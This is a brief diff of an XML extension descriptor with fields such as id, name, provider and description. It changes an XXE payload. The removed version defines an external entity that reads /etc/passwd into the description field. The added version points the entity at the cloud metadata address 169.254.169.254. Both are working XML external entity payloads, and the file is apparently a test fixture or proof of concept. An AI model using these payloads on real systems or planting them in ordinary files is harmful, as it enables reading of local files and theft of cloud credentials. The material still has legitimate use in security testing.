@@ -1,8 +1,8 @@
-<!DOCTYPE test [<!ENTITY desc PUBLIC "file" "file:///etc/passwd">]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
      <id>gj8dl19d0</id>
      <name>Interest Rates Now</name>
      <provider>Interest Rater</provider>
-     <description>&desc;</description>
+     <description>&xxe;</description>
      <extensionpoint>
           <location>REPORTING_VIEW</location>
           <label>label</label>
